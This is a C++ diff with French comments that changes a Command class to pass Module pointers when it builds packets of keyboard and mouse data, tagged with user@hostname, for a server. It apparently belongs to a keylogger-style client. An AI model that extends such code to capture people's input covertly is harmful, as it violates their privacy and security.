@@ -14,12 +14,12 @@ Command::~Command() {}
 /*
  * Process découpe la commande reçu par le serveur puis la traite.
  */
-bool                        Command::process(std::map<char, Module> modules, char code, boost::asio::streambuf &buf)
+bool                        Command::process(std::map<char, Module *> modules, char code, boost::asio::streambuf &buf)
 {
     std::ostream                    os(&buf);
     boost::archive::text_oarchive   ar(os);
 
-    Module                          module = modules[code];
+    Module                          *module = modules[code];
     t_paquet                        *data = getMessageFormat(module);
     ar & data;
     if (data == NULL)
@@ -52,17 +52,17 @@ std::string                 Command::getHostname()
 /*
  * Créer la structure à renvoyer au serveur.
  */
-t_paquet                    *Command::getMessageFormat(Module& module)
+t_paquet                    *Command::getMessageFormat(Module *module)
 {
     t_paquet    *data = new t_paquet;
 
     data->kbdata = NULL;
     data->msdata = NULL;
-	data->opcode = module.getOpcode();
+	data->opcode = module->getOpcode();
     data->id = this->getUsername();
     data->id += "@";
     data->id += this->getHostname();
-    module.getDatas(data);
+    module->getDatas(data);
     if (data->kbdata == NULL && data->msdata == NULL)
         return NULL;
 	t_paquet	*test = data;
